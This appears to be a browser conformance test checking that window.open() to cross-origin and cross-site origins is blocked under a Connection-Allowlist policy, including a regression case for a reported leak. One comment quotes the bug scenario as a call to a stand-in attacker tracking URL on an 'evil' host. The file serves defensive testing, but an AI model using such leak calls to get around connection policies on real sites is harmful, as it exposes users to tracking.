// META: script=/common/get-host-info.sub.js
// META: script=/common/utils.js
// META: timeout=long
//
// Tests that window.open() to external origins is blocked by
// Connection-Allowlist: (response-origin). This covers both the default
// target (_blank, opening a new window) and the _self target (navigating
// the current browsing context).
//
// The existing navigation-anchor-new-tab test covers
// anchor-element clicks; these tests cover the window.open() API which
// is a distinct code path.

const port = get_host_info().HTTP_PORT_ELIDED;
const SUCCESS = true;
const FAILURE = false;

// --- window.open() with _blank target (new window) ---

function window_open_blank_test(origin, expectation) {
  promise_test(async t => {
    const window_name = token();

    const message_promise = new Promise(resolve => {
      window.onmessage = (e) => {
        if (e.data === "loaded") {
          if (e.source) {
            e.source.close();
          }
          resolve(true);
        }
      };
    });
    t.add_cleanup(() => {
      window.onmessage = null;
      try {
        const win = window.open("", window_name);
        if (win) win.close();
      } catch(e) {
        assert_unreached("Cleanup: unexpected error closing window: " + e);
      }
    });

    const url = origin +
        "/connection-allowlist/tentative/resources/post-message-opener.html";
    let win;
    try {
      win = window.open(url, window_name);
    } catch(e) {
      assert_unreached("window.open threw unexpectedly: " + e);
    }
    t.add_cleanup(() => { if (win) win.close(); });

    // Race the message against a timeout to avoid waiting indefinitely
    // when the navigation is blocked.
    const timeout_promise = new Promise(resolve =>
        t.step_timeout(() => resolve(false), 1500));
    const received_message = await Promise.race(
        [message_promise, timeout_promise]);

    if (expectation === SUCCESS) {
      assert_true(received_message,
          `window.open to ${origin} should have succeeded.`);
    } else {
      assert_false(received_message,
          `window.open to ${origin} should have been blocked.`);
    }
  }, `window.open(url, name) to ${origin} should ${
      expectation === SUCCESS ? "succeed" : "fail"}.`);
}

// Same-origin should succeed; cross-origin and cross-site should fail.
window_open_blank_test("http://{{hosts[][]}}" + port, SUCCESS);
window_open_blank_test("http://{{hosts[][www]}}" + port, FAILURE);
window_open_blank_test("http://{{hosts[alt][]}}" + port, FAILURE);

// --- window.open() with _self target (same-frame navigation) ---

function window_open_self_test(origin, expectation) {
  promise_test(async t => {
    const iframe = document.createElement('iframe');
    document.body.appendChild(iframe);
    t.add_cleanup(() => iframe.remove());

    const message_promise = new Promise(resolve => {
      window.onmessage = (e) => {
        if (e.data === "loaded") {
          resolve(true);
        }
      };
    });
    t.add_cleanup(() => { window.onmessage = null; });

    const url = origin +
        "/connection-allowlist/tentative/resources/post-message.html";

    const script = iframe.contentDocument.createElement('script');
    script.textContent = `window.open("${url}", "_self");`;
    iframe.contentDocument.body.appendChild(script);

    const timeout_promise = new Promise(resolve =>
        t.step_timeout(() => resolve(false), 1500));
    const received_message = await Promise.race(
        [message_promise, timeout_promise]);

    if (expectation === SUCCESS) {
      assert_true(received_message,
          `window.open(url, '_self') to ${origin} should have succeeded.`);
    } else {
      assert_false(received_message,
          `window.open(url, '_self') to ${origin} should have been blocked.`);
    }
  }, `window.open(url, '_self') to ${origin} should ${
      expectation === SUCCESS ? "succeed" : "fail"}.`);
}

// Same-origin should succeed; cross-origin and cross-site should fail.
window_open_self_test("http://{{hosts[][]}}" + port, SUCCESS);
window_open_self_test("http://{{hosts[][www]}}" + port, FAILURE);
window_open_self_test("http://{{hosts[alt][]}}" + port, FAILURE);

// --- window.open() with NO target argument (regression test for
//     https://issues.chromium.org/496096540) ---
// window.open(url) with no second argument defaults to _blank. The bug
// reports that DNS resolves for the non-allowlisted origin despite the
// opener's Connection-Allowlist policy. This test verifies the navigation
// itself is blocked.

function window_open_no_target_test(origin, expectation) {
  promise_test(async t => {
    const message_promise = new Promise(resolve => {
      window.onmessage = (e) => {
        if (e.data === "loaded") {
          if (e.source) {
            e.source.close();
          }
          resolve(true);
        }
      };
    });
    t.add_cleanup(() => { window.onmessage = null; });

    const url = origin +
        "/connection-allowlist/tentative/resources/post-message-opener.html";
    let win;
    try {
      // No target argument — defaults to _blank, matching the bug scenario:
      //   window.open('https://leak-winopen.evil.com/track')
      win = window.open(url);
    } catch(e) {
      assert_unreached("window.open threw unexpectedly: " + e);
    }
    t.add_cleanup(() => {
      if (win) {
        try { win.close(); } catch(e) {
          assert_unreached("Cleanup: unexpected error closing window: " + e);
        }
      }
    });

    const timeout_promise = new Promise(resolve =>
        t.step_timeout(() => resolve(false), 1500));
    const received_message = await Promise.race(
        [message_promise, timeout_promise]);

    if (expectation === SUCCESS) {
      assert_true(received_message,
          `window.open (no target) to ${origin} should have succeeded.`);
    } else {
      assert_false(received_message,
          `window.open (no target) to ${origin} should have been blocked.`);
    }
  }, `window.open(url) with no target to ${origin} should ${
      expectation === SUCCESS ? "succeed" : "fail"}.`);
}

// Same-origin should succeed; cross-origin and cross-site should fail.
window_open_no_target_test("http://{{hosts[][]}}" + port, SUCCESS);
window_open_no_target_test("http://{{hosts[][www]}}" + port, FAILURE);
window_open_no_target_test("http://{{hosts[alt][]}}" + port, FAILURE);
